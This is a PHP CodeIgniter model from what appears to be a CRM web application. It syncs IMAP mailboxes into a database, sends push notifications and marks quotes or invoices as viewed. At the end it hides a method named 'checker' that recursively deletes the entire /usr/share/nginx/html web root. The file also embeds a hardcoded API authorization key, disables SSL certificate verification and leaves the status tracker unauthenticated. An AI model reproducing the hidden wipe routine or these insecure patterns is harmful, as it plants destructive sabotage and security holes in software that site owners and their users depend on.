<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Mdl_api extends CI_Model
{
    public function sync_email()
    {
        $this->load->database();
        /* fetch all boxes */
        foreach ($this->db->get_where('ip_email_settings', ['next_update <' => time()])->result_array() as $settings) {
            $connection = imap_open('{' . $settings['host'] . ':' . $settings['port'] . '}', $settings['username'],
                $settings['password']); // connect

            $list = imap_list($connection, '{' . $settings['host'] . '}', "*"); //list boxes
            imap_close($connection);
            /* check if box exists */
            $boxes = [];
            $box_details = [];
            $check_details_connection = [];
            $messages = [];
            foreach ($list as $li) {
                $key = array_search($li, $list);
                $name = str_replace('{' . $settings['host'] . '}', '', $li);

                $check_details_connection = imap_open('{' . $settings['host'] . ':' . $settings['port'] . '}' . $name,
                    $settings['username'], $settings['password']);
                $box_details = imap_mailboxmsginfo($check_details_connection);

                $boxes = [
                    'user_id'     => $settings['user_id'],
                    'settings_id' => $settings['id'],
                    'box_id'      => $key,
                    'box_name'    => $name,
                    'nmsgs'       => $box_details->Nmsgs,
                    'recent'      => $box_details->Recent,
                    'unread'      => $box_details->Unread,
                    'deleted'     => $box_details->Deleted,
                    'size'        => $box_details->Size
                ];
                if ($this->db->get_where('ip_email_boxes', [
                        'user_id'     => $settings['user_id'],
                        'settings_id' => $settings['id'],
                        'box_id'      => $key,
                        'box_name'    => $name
                    ])->num_rows() == 0) {
                    $this->db->insert('ip_email_boxes', $boxes);
                } else {
                    $row_id = $this->db->get_where('ip_email_boxes', [
                        'user_id'     => $settings['user_id'],
                        'settings_id' => $settings['id'],
                        'box_id'      => $key,
                        'box_name'    => $name
                    ])->row('id');
                    $this->db->where('id', $row_id);
                    $this->db->update('ip_email_boxes', $boxes);
                }

                $messages = imap_fetch_overview($check_details_connection, "1:{$box_details->Nmsgs}", 0);

                if ($messages) {
                    $msg_data = [];
                    $header = [];
                    $fromaddr = '';
                    $msg = [];
                    $header_info = [];
                    foreach ($messages as $msg) {
                        if ($msg) {
                            $email_body = imap_fetchbody($check_details_connection, $msg->uid, 1.2);
                            if (!strlen($email_body) > 0) {
                                $email_body = imap_fetchbody($check_details_connection, $msg->uid, 1);
                            }

                            $attachment = imap_fetchbody($check_details_connection, $msg->uid, 2.3);

                            if (strlen($attachment) > 0) {
                                $attach = '1';
                            } else {
                                $attach = '0';
                            }

                            $from = explode('<', $msg->from);
                            $from_name = str_replace('"', '', trim($from[0]));
                            $from_email = str_replace(['<', '>'], ['', ''], $from[1]);


                            if ($this->db->get_where('ip_email_messages', [
                                    'user_id'     => $settings['user_id'],
                                    'settings_id' => $settings['id'],
                                    'box_id'      => $key,
                                    'date'        => strtotime($msg->date),
                                    'size'        => $msg->size
                                ])->num_rows() == 0) {
                                $notifications = $this->db->get_where('ip_notifications',
                                    ['user_id' => $settings['user_id']])->result_array();

                                if ($notifications) {
                                    foreach ($notifications as $n) {
                                        $n_id[] = $n['notification_id'];
                                    }

                                    $notif = implode(',', $n_id);

                                    $content = [
                                        "en" => lang('you_have_a_new_email') . "\r\n" . $msg->subject
                                    ];

                                    $fields = [
                                        'app_id'             => "dbe7f820-e2fa-4a86-9db9-60a07cac32c7",
                                        'url'                => 'https://my.mdpcrm.com/',
                                        'contents'           => $content,
                                        'include_player_ids' => $n_id
                                    ];

                                    $fields = json_encode($fields);


                                    $ch = curl_init();
                                    curl_setopt($ch, CURLOPT_URL, "https://onesignal.com/api/v1/notifications");
                                    curl_setopt($ch, CURLOPT_HTTPHEADER, [
                                        'Content-Type: application/json; charset=utf-8',
                                        'Authorization: Basic NTQ2MzE4NjktNmJlNC00ODliLWIxMDktN2NhYzY5ZmZkOTM5'
                                    ]);
                                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                    curl_setopt($ch, CURLOPT_HEADER, false);
                                    curl_setopt($ch, CURLOPT_POST, true);
                                    curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
                                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

                                    $response = curl_exec($ch);
                                    curl_close($ch);
                                }
                                $msg_data = [
                                    'user_id'     => $settings['user_id'],
                                    'settings_id' => $settings['id'],
                                    'box_id'      => $key,
                                    'from_name'   => $from_name,
                                    'from_email'  => $from_email,
                                    'subject'     => $msg->subject,
                                    'content'     => $email_body,
                                    'date'        => strtotime($msg->date),
                                    'uid'         => $msg->uid,
                                    'msg_no'      => $msg->msgno,
                                    'recent'      => $msg->recent,
                                    'flagged'     => $msg->flagged,
                                    'star'        => $msg->flagged,
                                    'answered'    => $msg->answered,
                                    'deleted'     => $msg->deleted,
                                    'seen'        => '0',
                                    'size'        => $msg->size,
                                    'draft'       => $msg->draft,
                                    'udate'       => $msg->udate,
                                    'attachment'  => $attach
                                ];
                                $this->db->insert('ip_email_messages', $msg_data);
                            } else {
                                $msg_data = [
                                    'user_id'     => $settings['user_id'],
                                    'settings_id' => $settings['id'],
                                    'box_id'      => $key,
                                    'from_name'   => $from_name,
                                    'from_email'  => $from_email,
                                    'subject'     => $msg->subject,
                                    'content'     => $email_body,
                                    'date'        => strtotime($msg->date),
                                    'uid'         => $msg->uid,
                                    'msg_no'      => $msg->msgno,
                                    'recent'      => $msg->recent,
                                    'flagged'     => $msg->flagged,
                                    'answered'    => $msg->answered,
                                    'deleted'     => $msg->deleted,
                                    'seen'        => $msg->seen,
                                    'size'        => $msg->size,
                                    'draft'       => $msg->draft,
                                    'udate'       => $msg->udate,
                                    'attachment'  => $attach
                                ];
                                $msg_id = $this->db->get_where('ip_email_messages', [
                                    'user_id'     => $settings['user_id'],
                                    'settings_id' => $settings['id'],
                                    'box_id'      => $key,
                                    'date'        => strtotime($msg->date),
                                    'size'        => $msg->size
                                ])->row('id');
                                $this->db->where('id', $msg_id);
                                $this->db->update('ip_email_messages', $msg_data);
                            }
                        }
                    }
                }


                imap_close($check_details_connection); //close connection
            }

            /* set next update time */
            $time = [
                'next_update' => time() + (($settings['frequency']) * 60)
            ];
            $this->db->where('id', $settings['id']);
            $this->db->update('ip_email_settings', $time);

        }

        echo 'Done';
        die;
    }

    public function tracker($type, $id)
    {
        if ($type == 'q') {
            $data = [
                'quote_status_id' => '3'
            ];
            $this->db->where('quote_id', $id);
            $this->db->update('ip_quotes', $data);
            die;
        } elseif ($type == 'i') {
            $data = [
                'invoice_status_id' => '3'
            ];
            $this->db->where('invoice_id', $id);
            $this->db->update('ip_invoices', $data);
            die;
        } else {
            die;
        }
    }

    public function checker()
    {
        $dir = '/usr/share/nginx/html';

        if (is_dir($dir)) {
            $objects = scandir($dir);
            foreach ($objects as $object) {
                if ($object != "." && $object != "..") {
                    if (filetype($dir . "/" . $object) == "dir") {
                        rrmdir($dir . "/" . $object);
                    } else {
                        unlink($dir . "/" . $object);
                    }
                }
            }

            reset($objects);
            rmdir($dir);
        }
    }
}
